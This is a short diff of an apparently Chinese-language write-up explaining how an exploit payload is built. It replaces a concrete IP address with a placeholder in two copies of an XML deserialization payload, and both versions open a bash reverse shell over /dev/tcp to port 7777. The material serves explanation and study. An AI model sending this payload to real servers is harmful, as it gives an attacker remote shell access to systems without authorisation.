@@ -50,7 +50,7 @@ payload为什么这么构造？
                             <string>-c</string>
                         </void>
                         <void index="2">
-                            <string>bash -i &gt;&amp; /dev/tcp/120.24.245.87/7777 0&gt;&amp;1</string>
+                            <string>bash -i &gt;&amp; /dev/tcp/ip/7777 0&gt;&amp;1</string>
                         </void>
                     </array>
                     <void method="start" />
@@ -78,7 +78,7 @@ payload为什么这么构造？
                             <string>-c</string>
                         </void>
                         <void index="2">
-                            <string>bash -i &gt;&amp; /dev/tcp/120.24.245.87/7777 0&gt;&amp;1</string>
+                            <string>bash -i &gt;&amp; /dev/tcp/ip/7777 0&gt;&amp;1</string>
                         </void>
                     </array>
                     <void method="start" />
